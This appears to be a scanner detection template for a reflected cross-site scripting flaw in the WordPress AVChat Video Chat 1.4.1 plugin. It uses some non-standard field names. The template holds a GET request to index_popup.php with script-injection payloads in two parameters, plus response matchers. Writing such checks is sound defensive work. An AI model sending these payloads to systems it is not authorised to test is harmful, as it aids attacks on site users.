id: avchat-video-chat-xss
brief:
    title: WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting
    by: DhiyaneshDK
    level: medium
    about: WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.
    label:
        - xss
        - wp
        - wpscan
        - wordpress
        - wp-plugin
        - vuln
    score: CVSS:5.4
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&'
      signs:
        - "on": word
          has:
            - value="FB_appId"><script>alert(document.domain)</script>"
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
